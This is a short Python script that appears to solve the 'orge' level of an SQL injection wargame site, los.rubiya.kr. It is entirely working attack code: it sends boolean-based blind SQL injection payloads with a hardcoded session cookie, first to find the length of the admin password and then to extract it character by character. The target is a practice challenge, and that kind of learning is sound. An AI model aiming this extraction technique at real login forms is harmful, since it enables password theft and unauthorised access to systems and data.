import requests
session_id = {'PHPSESSID' : 'u5r1drkse5h11j80b3ljm8h5c0'}
parameters='abcdefghijklmnopqrstuvwxyz01234567890123456789'

for i in range(1,30):
    URL = "http://los.rubiya.kr/orge_bad2f25db233a7542be75844e314e9f3.php?pw==%27%20||%20id=%27admin%27%20&&%20pw=%20%27%20||%20length(pw)="+str(i)+"%23"

    respone=requests.get(URL,cookies=session_id)
    print(respone.url)
    if 'Hello admin' in respone.text:
        length=i
        print("length : ",length)
        break
pw=''
for i in range(1,length+1):
    for j in parameters:
        URL = "http://los.rubiya.kr/orge_bad2f25db233a7542be75844e314e9f3.php?pw==%27%20||%20id=%27admin%27%20%26%26%20substr(pw,"+str(i)+",1)=\'"+str(j)+"\'%23"
        respone=requests.get(URL,cookies=session_id)
        print(respone.url)
        if "Hello admin" in respone.text:
            print(j)
            pw+=str(j)
            break
print('password : '+pw)
